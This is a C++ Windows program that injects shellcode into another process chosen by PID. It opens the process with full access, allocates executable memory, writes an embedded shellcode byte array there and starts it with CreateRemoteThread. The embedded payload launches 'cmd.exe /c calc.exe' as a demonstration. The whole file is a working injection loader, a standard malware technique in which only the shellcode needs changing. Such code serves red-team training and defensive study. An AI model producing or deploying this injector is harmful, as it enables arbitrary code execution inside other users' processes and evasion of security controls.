#include <iostream>
#include <windows.h>

using namespace std;

const char *k = "[+]";
const char *n = "[-]";
const char *i = "[*]";

const char my_shell[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
                        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
                        "\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61"
                        "\x6c\x63\x2e\x65\x78\x65\x00";
size_t shell_code_size = sizeof(my_shell);

DWORD getProcessIdFromArgs(int argc, char *argv[]);
HANDLE getProcessHandle(DWORD processId);
LPVOID allocateMemoryInTargetProcess(HANDLE hProcess, size_t size);
bool writeShellCodeToTargetProcess(HANDLE hProcess, LPVOID remoteBuffer, const char *shellcode, size_t size);
HANDLE createRemoteThreadInTargetProcess(HANDLE hProcess, LPVOID remoteBuffer);

int main(int argc, char *argv[])
{
    DWORD processId = getProcessIdFromArgs(argc, argv);
    HANDLE hProcess = getProcessHandle(processId);
    LPVOID remoteBuffer = allocateMemoryInTargetProcess(hProcess, shell_code_size);

    if (!writeShellCodeToTargetProcess(hProcess, remoteBuffer, my_shell, shell_code_size))
    {
        cout << n << "The shell code was not written in the allocated buffer." << endl;
        return EXIT_FAILURE;
    }

    HANDLE hThread = createRemoteThreadInTargetProcess(hProcess, remoteBuffer);

    if (hThread == NULL)
    {
        cout << n << " failed to get a handle to the new thread, error: " << GetLastError() << endl;
        return EXIT_FAILURE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}

DWORD getProcessIdFromArgs(int argc, char *argv[])
{
    if (argc < 2)
    {
        cout << "Please provide a valid process id." << endl
             << "%s usage: %s <PID>" << n,
            argv[0];

        exit(EXIT_FAILURE);
    }
    DWORD processId = atoi(argv[1]);
    cout << i << "Attempting to get a handle on the process." << processId << endl;

    return processId;
}

HANDLE getProcessHandle(DWORD processId)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);

    if (!hProcess)
    {
        cout << n << " Was not able to get a handle on the " << processId << " process" << endl;
        cout << i << "This was the following error." << GetLastError();
        exit(EXIT_FAILURE);
    }
    cout << k << "We got a handle." << hProcess << endl;

    return hProcess;
}

LPVOID allocateMemoryInTargetProcess(HANDLE hProcess, size_t size)
{
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    if (!remoteBuffer)
    {
        cout << n << "The buffer was not allocated. With the following error." << GetLastError();
        exit(EXIT_FAILURE);
    }
    cout << k << "The buffer was allocated with the following memory size in bytes: " << size << endl;

    return remoteBuffer;
}

bool writeShellCodeToTargetProcess(HANDLE hProcess, LPVOID remoteBuffer, const char *shellcode, size_t size)
{
    SIZE_T bytesWritten;
    BOOL success = WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, &bytesWritten);

    if (!success || bytesWritten != size)
    {
        cout << n << "The shell code was not written in the allocated buffer." << endl;
        return false;
    }

    return true;
}

HANDLE createRemoteThreadInTargetProcess(HANDLE hProcess, LPVOID remoteBuffer)
{
    DWORD threadId;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, &threadId);

    if (hThread == NULL)
    {
        cout << n << " failed to get a handle to the new thread, error: " << GetLastError() << endl;
        return NULL;
    }

    cout << k << " got a handle to the newly-created thread (" << threadId << ")" << endl
         << "\\---0x" << hProcess << endl;

    return hThread;
}
